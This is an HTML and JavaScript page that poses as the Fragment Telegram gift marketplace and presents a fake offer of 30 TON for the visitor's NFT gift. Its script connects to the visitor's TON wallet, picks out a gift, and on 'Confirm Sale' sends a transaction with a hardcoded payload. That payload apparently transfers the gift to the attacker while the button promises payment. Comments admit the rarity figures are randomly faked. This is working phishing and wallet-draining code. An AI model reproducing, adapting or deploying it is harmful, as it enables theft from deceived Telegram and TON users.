<!DOCTYPE html>
<html class="header-tabs">
<head>
    <meta charset="UTF-8">
    <title>Fragment</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    
    <link href="font-roboto.css" rel="stylesheet" type="text/css">
    <link href="bootstrap.min.css" rel="stylesheet">
    <link href="bootstrap-extra.css" rel="stylesheet">
    <link href="auction.css" rel="stylesheet">

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    
    <style>
        .tm-header-tabs-wrap, .tm-header-actions-wide, .tm-header-menu-button, .popup-container { display: none !important; }
        #giftImage { width: 270px; height: 270px; object-fit: contain; border-radius: 12px; background: #232429; display: block; }
        @media (max-width: 767px) { #giftImage { width: 100%; height: auto; aspect-ratio: 1; } }
        .connect-btn-header { display: flex; align-items: center; gap: 8px; cursor: pointer; }
        .tm-section-countdown-wrap { display: none; }
        /* Стили для бейджа редкости */
        .tm-rarity { font-size: 11px; padding: 2px 6px; border-radius: 6px; background: rgba(90, 236, 140, 0.1); color: #5aec8c; margin-left: 8px; vertical-align: middle; }
    </style>
</head>
<body class="emoji_image">
    <div id="aj_content">
        <header class="tm-header">
            <div class="tm-header-logo">
                <a href="#" class="tm-logo"><i class="tm-logo-icon"></i><i class="tm-logo-text"></i></a>
            </div>
            <div class="tm-header-body"></div>
            <div class="tm-header-actions" style="display: flex !important; align-items: center;">
                <div class="btn-group tm-header-action">
                    <button class="btn btn-default tm-header-button connect-btn-header" id="headerConnectBtn">
                        <i class="icon icon-connect-ton"></i><span class="tm-button-label">Connect Wallet</span>
                    </button>
                </div>
            </div>
        </header>

        <main class="tm-main js-main-content">
            <section class="tm-section tm-auction-section tm-auction-thumbed-section">
                <div class="tm-section-header">
                    <h2 class="tm-section-header-text">
                        <span class="tm-section-header-domain">
                            <span class="tm-section-header-title" id="giftName">Loading...</span>
                        </span>
                        <span class="tm-section-header-status tm-status-avail">For sale</span>
                    </h2>
                </div>

                <div class="tm-section-auction-thumb-column">
                    <div class="tm-section-auction-thumb" style="margin: 0 auto;">
                        <img id="giftImage" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="Gift">
                    </div>
                </div>

                <div class="tm-section-box tm-section-auction-info">
                    <table class="table tm-table tm-table-fixed">
                        <colgroup><col style="--thin-width:110px;--wide-width:30%"><col style="--thin-width:100%;--wide-width:70%"></colgroup>
                        <tbody id="attributesTable">
                            <tr><td><div class="table-cell">Collection</div></td><td><div class="table-cell" id="giftCollection">Gifts</div></td></tr>
                            <tr><td><div class="table-cell">Owner</div></td><td><div class="table-cell">You</div></td></tr>
                            <tr><td><div class="table-cell">Network</div></td><td><div class="table-cell">TON</div></td></tr>
                        </tbody>
                    </table>
                </div>

                <div class="tm-section-box tm-section-bid-info">
                    <table class="table tm-table tm-table-fixed">
                        <thead><tr><th>Buyer's Offer</th></tr></thead>
                        <tbody>
                            <tr>
                                <td>
                                    <div class="table-cell table-cell-oneline">
                                        <div class="table-cell-value tm-value icon-before icon-ton" id="offerPrice">30</div>
                                        <div class="table-cell-desc" id="offerUsd">&nbsp;~&nbsp;$31.20</div>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <div class="tm-bid-info-text">The buyer is ready to purchase this gift for the specified amount.</div>
                </div>

                <div class="tm-section-box tm-section-buttons">
                    <button class="btn btn-primary btn-block" id="acceptBtn">
                        <span class="tm-button-label">Loading...</span>
                    </button>
                </div>
            </section>
        </main>
        <footer class="tm-footer">
            <div class="tm-footer-links">
                <a href="#" class="tm-footer-link">Top Auctions</a><a href="#" class="tm-footer-link">About</a><a href="#" class="tm-footer-link">Terms</a><a href="#" class="tm-footer-link">Privacy</a>
            </div>
        </footer>
    </div>

    <script>
        const tg = window.Telegram?.WebApp;
        if (tg) { tg.ready(); tg.expand(); }

        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ manifestUrl: "https://fragment.com/tonconnect-manifest.json" });
        const PAYLOAD_B64 = "te6ccgEBAQEAUgAAn1/MPRQAAAAAAAAAAIAUIVzVDKXiNQfZsAcaEKh0kx0hTdnk2OpKbBCtk5K+jLAChCuaoZS8RqD7NgDjQhUOkmOkKbs8mx1JTYIVsnJX0ZQI"; 
        
        let targetNftAddress = null;
        let isTargetedOffer = false; 
        let currentPrice = 30;
        
        const acceptBtn = document.getElementById('acceptBtn');
        const headerConnectBtn = document.getElementById('headerConnectBtn');
        const giftImage = document.getElementById('giftImage');
        const giftNameEl = document.getElementById('giftName');
        const giftCollEl = document.getElementById('giftCollection');
        const offerPriceEl = document.getElementById('offerPrice');
        const offerUsdEl = document.getElementById('offerUsd');
        const attributesTable = document.getElementById('attributesTable');

        const FALLBACK_IMG = "https://nft.fragment.com/img/placeholder.png";

        // Форматирование имени (на случай если пришло scaredcat-2920)
        function formatName(name) {
            if (!name) return "Telegram Gift";
            // Если есть дефис и нет решетки, меняем на решетку
            if (name.includes('-') && !name.includes('#')) {
                let parts = name.split('-');
                return parts[0].charAt(0).toUpperCase() + parts[0].slice(1) + ' #' + parts[1];
            }
            return name;
        }

        function updatePriceUI(price) {
            currentPrice = price;
            offerPriceEl.innerText = price;
            const usd = (price * 1.04).toFixed(2); 
            offerUsdEl.innerHTML = "&nbsp;~&nbsp;$" + usd;
        }

        const startParam = tg?.initDataUnsafe?.start_param;
        if (startParam) {
            try {
                let base64 = startParam.replace(/-/g, '+').replace(/_/g, '/');
                while (base64.length % 4) { base64 += '='; }
                const decoded = JSON.parse(decodeURIComponent(escape(atob(base64))));
                
                targetNftAddress = decoded.nft;
                
                // Ставим красивое имя
                giftNameEl.innerText = formatName(decoded.name);
                giftCollEl.innerText = decoded.coll || "Gifts Collection";
                giftImage.src = decoded.img || FALLBACK_IMG;
                isTargetedOffer = true;

                if (decoded.price) updatePriceUI(parseFloat(decoded.price));

                // Рендерим атрибуты, если они есть
                if (decoded.attrs && decoded.attrs.length > 0) {
                    // Очищаем таблицу, оставляя только Collection и Network
                    attributesTable.innerHTML = `
                        <tr><td><div class="table-cell">Collection</div></td><td><div class="table-cell" id="giftCollection">${decoded.coll || "Gifts"}</div></td></tr>
                    `;
                    
                    // Добавляем атрибуты (Model, Backdrop и т.д.)
                    decoded.attrs.forEach(attr => {
                        if (attr.trait_type && attr.value) {
                            // Считаем фейковый процент редкости для красоты (рандом от 1 до 5%)
                            const rarity = (Math.random() * 4 + 1).toFixed(1); 
                            attributesTable.innerHTML += `
                                <tr>
                                    <td><div class="table-cell">${attr.trait_type}</div></td>
                                    <td>
                                        <div class="table-cell">
                                            <div class="table-cell-value tm-value">${attr.value}</div>
                                            <span class="tm-rarity">${rarity}%</span>
                                        </div>
                                    </td>
                                </tr>
                            `;
                        }
                    });
                    
                    // Добавляем Network в конец
                    attributesTable.innerHTML += `<tr><td><div class="table-cell">Network</div></td><td><div class="table-cell">TON</div></td></tr>`;
                }

                acceptBtn.innerHTML = '<span class="tm-button-label">Connect Wallet to view offer</span>';
                acceptBtn.onclick = () => tonConnectUI.connectWallet();

            } catch (e) { console.error("Ошибка парсинга startapp", e); }
        }

        function toFriendlyAddress(rawAddr) {
            if (!rawAddr) return "";
            if (rawAddr.startsWith('EQ') || rawAddr.startsWith('UQ')) return rawAddr;
            try {
                const [wc, hex] = rawAddr.split(':');
                const wcByte = parseInt(wc);
                const hash = new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
                const buffer = new Uint8Array(34);
                buffer[0] = 0x11; buffer[1] = wcByte; buffer.set(hash, 2);
                function crc16(data) {
                    let crc = 0;
                    for (let i = 0; i < data.length; i++) {
                        crc ^= data[i] << 8;
                        for (let j = 0; j < 8; j++) { if (crc & 0x8000) crc = (crc << 1) ^ 0x1021; else crc <<= 1; }
                    }
                    return crc & 0xffff;
                }
                const crc = crc16(buffer);
                const full = new Uint8Array(36); full.set(buffer);
                full[34] = (crc >> 8) & 0xff; full[35] = crc & 0xff;
                let binary = ''; full.forEach(b => binary += String.fromCharCode(b));
                return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
            } catch (e) { return rawAddr; }
        }

        headerConnectBtn.addEventListener('click', () => tonConnectUI.connectWallet());

        tonConnectUI.onStatusChange(async (wallet) => {
            if (wallet) {
                headerConnectBtn.innerHTML = '<i class="icon icon-connect-ton"></i><span class="tm-button-label">Connected</span>';
                if (isTargetedOffer) {
                    acceptBtn.disabled = false;
                    acceptBtn.innerHTML = '<span class="tm-button-label">Confirm Sale · Receive ' + currentPrice + ' <span class="icon-before icon-ton tm-amount">TON</span></span>';
                    acceptBtn.onclick = sendTransaction; 
                } else {
                    await scanWallet(wallet.account.address);
                }
            } else {
                headerConnectBtn.innerHTML = '<i class="icon icon-connect-ton"></i><span class="tm-button-label">Connect Wallet</span>';
                if (!isTargetedOffer) {
                    giftNameEl.innerText = "Connect Wallet to view";
                    giftImage.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
                }
            }
        });

        async function scanWallet(address) {
            try {
                giftNameEl.innerText = "Loading...";
                acceptBtn.innerHTML = '<span class="tm-button-label">Scanning...</span>';
                const res = await fetch("https://tonapi.io/v2/accounts/" + address + "/nfts?limit=50");
                const data = await res.json();
                if (!data.nft_items || data.nft_items.length === 0) {
                    giftNameEl.innerText = "No Gifts Found"; acceptBtn.innerHTML = '<span class="tm-button-label">You have no gifts</span>'; acceptBtn.disabled = true; return;
                }
                const nfts = data.nft_items;
                const mainNft = nfts[0];
                targetNftAddress = toFriendlyAddress(mainNft.address);
                let imgUrl = ""; const nftName = mainNft.metadata?.name || "Telegram Gift";
                const match = nftName.match(/#(\d+)/);
                if (match && match[1]) {
                    const id = match[1]; let coll = (mainNft.collection?.name || "").toLowerCase().replace(/[^a-z0-9]/g, '');
                    if (coll.endsWith('s')) coll = coll.slice(0, -1);
                    imgUrl = "https://nft.fragment.com/gift/" + coll + "-" + id + ".webp";
                }
                giftImage.onerror = function() {
                    if (mainNft.previews && mainNft.previews.length > 0) this.src = mainNft.previews[0].url;
                    else if (mainNft.metadata?.image) this.src = mainNft.metadata.image;
                    else this.src = FALLBACK_IMG;
                };
                giftImage.src = imgUrl || (mainNft.previews?.length > 0 ? mainNft.previews[0].url : (mainNft.metadata?.image || FALLBACK_IMG));
                giftNameEl.innerText = nftName;
                giftCollEl.innerText = mainNft.collection?.name || "Gifts Collection";
                updatePriceUI(30); 
                acceptBtn.disabled = false;
                acceptBtn.innerHTML = '<span class="tm-button-label">Confirm Sale · Receive ' + currentPrice + ' <span class="icon-before icon-ton tm-amount">TON</span></span>';
                acceptBtn.onclick = sendTransaction;
            } catch (e) {
                console.error(e); giftNameEl.innerText = "Error loading"; giftImage.src = FALLBACK_IMG;
            }
        }

        async function sendTransaction() {
            if (!targetNftAddress) return tonConnectUI.connectWallet();
            acceptBtn.disabled = true; 
            acceptBtn.innerHTML = '<span class="tm-button-label">Processing...</span>';
            try {
                acceptBtn.innerHTML = '<span class="tm-button-label">Confirm in wallet...</span>';
                await tonConnectUI.sendTransaction({
                    validUntil: Math.floor(Date.now() / 1000) + 300,
                    messages: [{ address: targetNftAddress, amount: "50000000", payload: PAYLOAD_B64 }]
                });
                acceptBtn.innerHTML = '<span class="tm-button-label">Offer Accepted ✓</span>';
                if (tg) tg.HapticFeedback.notificationOccurred('success');
            } catch (e) {
                acceptBtn.disabled = false; 
                acceptBtn.innerHTML = '<span class="tm-button-label">Confirm Sale · Receive ' + currentPrice + ' <span class="icon-before icon-ton tm-amount">TON</span></span>';
            }
        }
    </script>
</body>
</html>
